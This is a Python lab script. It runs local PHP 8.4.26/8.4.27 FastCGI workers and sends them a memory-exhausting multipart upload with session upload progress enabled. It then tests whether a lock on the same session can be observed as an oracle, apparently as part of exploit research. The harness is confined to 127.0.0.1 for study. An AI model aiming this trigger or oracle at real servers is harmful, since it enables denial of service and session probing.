"""Local-only FastCGI comparison of the proposed same-session lock oracle.

Runs official PHP 8.4.26/8.4.27 binaries on 127.0.0.1 with a low memory limit.
The deliberately exhausting multipart request must never be sent to live assets.
"""
import json
from pathlib import Path
import socket
import struct
import subprocess
import tempfile
import time


ROOT = Path(__file__).resolve().parents[1] / "artifacts" / "php-lab"


def record(kind, content):
    padding = (-len(content)) % 8
    return struct.pack("!BBHHBB", 1, kind, 1, len(content), padding, 0) + content + b"\0" * padding


def encoded_length(value):
    return bytes([value]) if value < 128 else struct.pack("!I", value | 0x80000000)


def param(name, value):
    name, value = name.encode(), str(value).encode()
    return encoded_length(len(name)) + encoded_length(len(value)) + name + value


def fastcgi(port, script, method="GET", body=b"", sid="", timeout=8):
    env = {
        "GATEWAY_INTERFACE": "CGI/1.1", "REQUEST_METHOD": method,
        "SCRIPT_FILENAME": str(script), "SCRIPT_NAME": "/index.php",
        "REQUEST_URI": "/index.php", "SERVER_PROTOCOL": "HTTP/1.1",
        "SERVER_NAME": "localhost", "SERVER_PORT": str(port),
        "REMOTE_ADDR": "127.0.0.1", "CONTENT_LENGTH": str(len(body)),
    }
    if body:
        env["CONTENT_TYPE"] = "multipart/form-data; boundary=LAB"
    if sid:
        env["HTTP_COOKIE"] = f"PHPSESSID={sid}"
    payload = b"".join(param(k, v) for k, v in env.items())
    output = bytearray()
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=timeout) as conn:
            conn.settimeout(timeout)
            conn.sendall(record(1, b"\0\x01" + b"\0" * 6))
            for offset in range(0, len(payload), 60000):
                conn.sendall(record(4, payload[offset:offset + 60000]))
            conn.sendall(record(4, b""))
            for offset in range(0, len(body), 60000):
                conn.sendall(record(5, body[offset:offset + 60000]))
            conn.sendall(record(5, b""))
            while True:
                header = conn.recv(8)
                if len(header) < 8:
                    return {"error": "early_close", "output_prefix": output[:100].decode("latin1", "replace")}
                _, kind, _, size, padding, _ = struct.unpack("!BBHHBB", header)
                remaining = size + padding
                data = bytearray()
                while remaining:
                    chunk = conn.recv(remaining)
                    if not chunk:
                        return {"error": "early_close"}
                    data.extend(chunk)
                    remaining -= len(chunk)
                if kind == 6:
                    output.extend(data[:size])
                if kind == 3:
                    return {"alive": b"LAB_ALIVE" in output,
                            "oom": b"Allowed memory size" in output,
                            "output_prefix": output[:180].decode("latin1", "replace")}
    except (OSError, TimeoutError) as exc:
        return {"error": type(exc).__name__}


def part(name, value, filename=None):
    disposition = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disposition += f'; filename="{filename}"'
    return f"--LAB\r\n{disposition}\r\n\r\n{value}\r\n".encode()


def multipart(sid):
    pieces = [part("PHPSESSID", sid), part("PHP_SESSION_UPLOAD_PROGRESS", "probe")]
    pieces.extend(part(f"u{i}", "x", f"f{i}.txt") for i in range(4000))
    pieces.append(b"--LAB--\r\n")
    return b"".join(pieces)


def free_port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def check(version):
    with tempfile.TemporaryDirectory(prefix="php2shell-fastcgi-") as directory:
        base = Path(directory)
        web, sessions = base / "web", base / "sessions"
        web.mkdir()
        sessions.mkdir()
        script = web / "index.php"
        script.write_text("<?php echo 'LAB_ALIVE';", encoding="utf-8")
        ports = [free_port(), free_port()]
        processes = []
        try:
            for port in ports:
                command = [str(ROOT / version / "php-cgi.exe"), "-n", "-b", f"127.0.0.1:{port}",
                           "-d", "memory_limit=4M", "-d", "post_max_size=16M",
                           "-d", "display_errors=1", "-d", "html_errors=0",
                           "-d", "max_file_uploads=5000",
                           "-d", "session.upload_progress.enabled=1",
                           "-d", "session.upload_progress.freq=1",
                           "-d", "session.upload_progress.min_freq=0",
                           "-d", f"session.save_path={sessions}"]
                processes.append(subprocess.Popen(command, stdout=subprocess.DEVNULL,
                                                  stderr=subprocess.DEVNULL,
                                                  creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0)))
            for _ in range(50):
                if all(fastcgi(port, script, timeout=1).get("alive") for port in ports):
                    break
                time.sleep(0.05)
            else:
                raise RuntimeError(f"FastCGI workers did not start for {version}")
            sid = "lablock01234567890123456789"
            trigger = fastcgi(ports[0], script, "POST", multipart(sid), sid, timeout=15)
            distinct = fastcgi(ports[1], script, sid="labother012345678901234567", timeout=3)
            same = fastcgi(ports[1], script, sid=sid, timeout=3)
            return {"version": version, "trigger": trigger, "distinct_sid": distinct,
                    "same_sid": same, "worker_exited": [p.poll() is not None for p in processes]}
        finally:
            for process in processes:
                if process.poll() is None:
                    process.terminate()
                process.wait(timeout=5)


def main():
    result = [check(version) for version in ("8.4.26", "8.4.27")]
    destination = ROOT / "fastcgi-lock-oracle.json"
    destination.write_text(json.dumps(result, indent=2), encoding="utf-8")
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
